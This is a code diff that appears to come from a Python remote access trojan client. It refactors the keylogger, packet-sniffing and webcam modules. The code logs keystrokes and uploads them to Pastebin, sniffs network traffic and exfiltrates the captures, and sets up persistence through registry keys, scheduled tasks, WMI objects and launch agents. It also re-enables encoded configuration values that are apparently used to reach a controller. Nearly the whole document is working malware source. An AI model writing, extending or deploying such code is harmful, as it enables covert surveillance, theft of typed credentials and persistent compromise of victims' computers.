@@ -87,35 +87,38 @@ class Client(object):
             self._print("Bytes-to-long conversion error: {}".format(str(e)))            
 
     def _print(self, data):
-        if bool('__v__' in vars(self) and self.__v__):
-            print(data)
+#        if bool('__v__' in vars(self) and self.__v__):
+        print(data)
 
     def _command(fx, cx=__command__, mx=__modules__):
         fx.status = threading.Event()
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
-            fx.options = {'registry_key':True, 'scheduled_task':True, 'wmi_object':True, 'startup_file':True, 'hidden_file':True} if os.name is 'nt' else {'launch_agent':True, 'hidden_file':True}
+            fx.options   = {'registry_key':True, 'scheduled_task':True, 'wmi_object':True, 'startup_file':True, 'hidden_file':True} if os.name is 'nt' else {'launch_agent':True, 'hidden_file':True}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
                 cx.update({fx.func_name: fx})
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
-            fx.options = {'max_size': 1024, 'buffer': None, 'window': None}
+            fx.options   = {'max_size': 1024}
+            fx.window    = None
+            fx.buffer    = None
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
                 cx.update({fx.func_name: fx})
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
-            fx.options = {'image': True, 'video': bool()}
+            fx.options   = {'image': True, 'video': bool()}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
                 cx.update({fx.func_name: fx})
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
-            fx.options = { 'capture':[], 'duration': 300.0}
+            fx.options   = {'duration': 300.0 }
+            fx.capture   = []
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
@@ -127,7 +130,7 @@ class Client(object):
                 mx.update({fx.func_name: fx})
                 cx.update({fx.func_name: fx})
         elif fx.func_name is 'upload':
-            fx.options = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
+            fx.options   = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
             fx.status.set()
             cx.update({fx.func_name: fx})
         elif fx.func_name is 'encryption':
@@ -370,9 +373,7 @@ class Client(object):
     def _keylogger(self):
         self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name=time.time())
         self._threads['keylogger'].start()
-        result = 'Keylogger started at {}'.format(time.ctime())
-        self._result['keylogger'].update({ time.ctime() : result })
-        return result
+        return 'Keylogger started at {}'.format(time.ctime())
 
     def _webcam(self):
         if self.webcam.options['video']:
@@ -408,19 +409,19 @@ class Client(object):
         return result
 
     def _diffiehellman(self):
-        if '_socket' in vars(self):
+        try:
             g  = 2
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             a  = self._bytes_to_long(os.urandom(self.encryption.options.get('key_size')))
             xA = pow(g, a, p)
-            try:
-                self._socket.send(self._long_to_bytes(xA))
-                xB = self._bytes_to_long(self._socket.recv(256))
-                x  = pow(xB, a, p)
-                return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), self._long_to_bytes(x)).digest()
-            except socket.error:
-                self._connected.clear()
-                return self._connect()
+            self._socket.send(self._long_to_bytes(xA))
+            xB = self._bytes_to_long(self._socket.recv(256))
+            x  = pow(xB, a, p)
+            return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), self._long_to_bytes(x)).digest()
+        except socket.error:
+            self._print('Diffie-Hellman transaction-less key exchange failed')
+            self._connected.clear()
+            return self._connect()
 
     def _connect(self, host='localhost', port=1337):
         def _addr(a, b, c):
@@ -859,26 +860,26 @@ class Client(object):
     def _keylogger_event(self, event):
         if event.WindowName != self.keylogger.options['window']:
             self.keylogger.options['window'] = event.WindowName
-            self.keylogger.options['buffer'].write("\n[{}]\n".format(self.keylogger.options['window']))
+            self.keylogger.buffer.write("\n[{}]\n".format(self.keylogger.options['window']))
         if event.Ascii > 32 and event.Ascii < 127:
-            self.keylogger.options['buffer'].write(chr(event.Ascii))
+            self.keylogger.buffer.write(chr(event.Ascii))
         elif event.Ascii == 32:
-            self.keylogger.options['buffer'].write(' ')
+            self.keylogger.buffer.write(' ')
         elif event.Ascii in (10,13):
-            self.keylogger.options['buffer'].write('\n')
+            self.keylogger.buffer.write('\n')
         elif event.Ascii == 8:
-            self.keylogger.options['buffer'] = self.keylogger.options['buffer'].seek(self.keylogger.options['buffer'].tell() - 1)
-            self.keylogger.options['buffer'].truncate()
+            self.keylogger.buffer = self.keylogger.buffer.seek(self.keylogger.buffer.tell() - 1)
+            self.keylogger.buffer.truncate()
         else:
             pass
         return True
-        
+
     def _keylogger_helper(self):
+        self.keylogger.buffer = tempfile.SpooledTemporaryFile(max_size=self.keylogger.options.get('max_size'), suffix='.txt')
         while True:
             try:
-                self.keylogger.options['buffer'] = tempfile.SpooledTemporaryFile(max_size=self.keylogger.options.get('max_size'), suffix='.txt')
                 while True:
-                    if self.keylogger.options['buffer']._rolled:
+                    if self.keylogger.buffer._rolled:
                         break
                     elif self._exit:
                         break
@@ -886,10 +887,10 @@ class Client(object):
                         break
                     else:
                         time.sleep(5)
-                result = self._upload_pastebin(self.keylogger.options['buffer'].name)
+                result = self._upload_pastebin(self.keylogger.buffer.name)
                 self._result.update({time.ctime(): result})
                 try:
-                    os.remove(self.keylogger.options['buffer'].name)
+                    os.remove(self.keylogger.buffer.name)
                 except: pass
                 if self._exit:
                     break
@@ -955,16 +956,16 @@ class Client(object):
             length = udp_hdr[2]
             chksum = udp_hdr[3]
             data = data[8:]
-            self.packetsniff.options['capture'].append('|================== UDP HEADER ==================|')
-            self.packetsniff.options['capture'].append('|================================================|')
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Source', src))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Length', length))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
-            self.packetsniff.options['capture'].append('|================================================|')
+            self.packetsniff.capture.append('|================== UDP HEADER ==================|')
+            self.packetsniff.capture.append('|================================================|')
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Length', length))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
+            self.packetsniff.capture.append('|================================================|')
             return data
         except Exception as e:
-            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('UDP', str(e)))
+            self.packetsniff.capture.append("Error in {} header: '{}'".format('UDP', str(e)))
 
     def _packetsniff_tcp_header(self, recv_data):
         try:
@@ -988,20 +989,20 @@ class Client(object):
             chk_sum = tcp_hdr[6]
             urg_pnt = tcp_hdr[7]
             recv_data = recv_data[20:]
-            self.packetsniff.options['capture'].append('|================== TCP HEADER ==================|')
-            self.packetsniff.options['capture'].append('|================================================|')
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Window', win))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
-            self.packetsniff.options['capture'].append('|================================================|')
+            self.packetsniff.capture.append('|================== TCP HEADER ==================|')
+            self.packetsniff.capture.append('|================================================|')
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Window', win))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
+            self.packetsniff.capture.append('|================================================|')
             return recv_data
         except Exception as e:
-            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('TCP', str(e)))
+            self.packetsniff.capture.append("Error in {} header: '{}'".format('TCP', str(e)))
 
     def _packetsniff_ip_header(self, data):
         try:
@@ -1019,24 +1020,24 @@ class Client(object):
             src = socket.inet_ntoa(ip_hdr[6])
             dest = socket.inet_ntoa(ip_hdr[7])
             data = data[20:]
-            self.packetsniff.options['capture'].append('|================== IP HEADER ===================|')
-            self.packetsniff.options['capture'].append('|================================================|')
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('VER', ver))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Source IP', src))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
-            self.packetsniff.options['capture'].append('|================================================|')
+            self.packetsniff.capture.append('|================== IP HEADER ===================|')
+            self.packetsniff.capture.append('|================================================|')
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('VER', ver))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Source IP', src))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
+            self.packetsniff.capture.append('|================================================|')
             return data, ipproto
         except Exception as e:
-            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('IP', str(e)))
+            self.packetsniff.capture.append("Error in {} header: '{}'".format('IP', str(e)))
 
 
     def _packetsniff_eth_header(self, data):
@@ -1046,19 +1047,19 @@ class Client(object):
             dst_mac = binascii.hexlify(eth_hdr[0])
             src_mac = binascii.hexlify(eth_hdr[1])
             proto = eth_hdr[2] >> 8
-            self.packetsniff.options['capture'].append('|================================================|')
-            self.packetsniff.options['capture'].append('|================== ETH HEADER ==================|')
-            self.packetsniff.options['capture'].append('|================================================|')
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
-            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
-            self.packetsniff.options['capture'].append('|================================================|')
+            self.packetsniff.capture.append('|================================================|')
+            self.packetsniff.capture.append('|================== ETH HEADER ==================|')
+            self.packetsniff.capture.append('|================================================|')
+            self.packetsniff.capture.append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
+            self.packetsniff.capture.append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
+            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
+            self.packetsniff.capture.append('|================================================|')
             if proto == 8:
                 ip_bool = True
             data = data[14:]
             return data, ip_bool
         except Exception as e:
-            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('ETH', str(e)))
+            self.packetsniff.capture.append("Error in {} header: '{}'".format('ETH', str(e)))
 
     def _packetsniff_manager(self, seconds):
         if os.name is 'nt':
@@ -1079,11 +1080,11 @@ class Client(object):
         try:
             sniffer_socket.close()
         except: pass
-        result = '\n'.join(self.packetsniff.options['capture'])
+        result = '\n'.join(self.packetsniff.capture)
         if self.upload.status.is_set():
             result = self._upload_pastebin(result)
         self._result['packetsniff'][time.ctime()] = result
-        self.packetsniff.options['capture'] = []
+        self.packetsniff.capture = []
         return result
 
     # ------------------- persistence -------------------------
@@ -1267,9 +1268,9 @@ class Client(object):
 
 def main(*args, **kwargs):
     kwargs = {
-#            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
             "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-#            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
             "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
             "__e__": "423224063517525567299427660991207813087967857812230603629111",
             "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
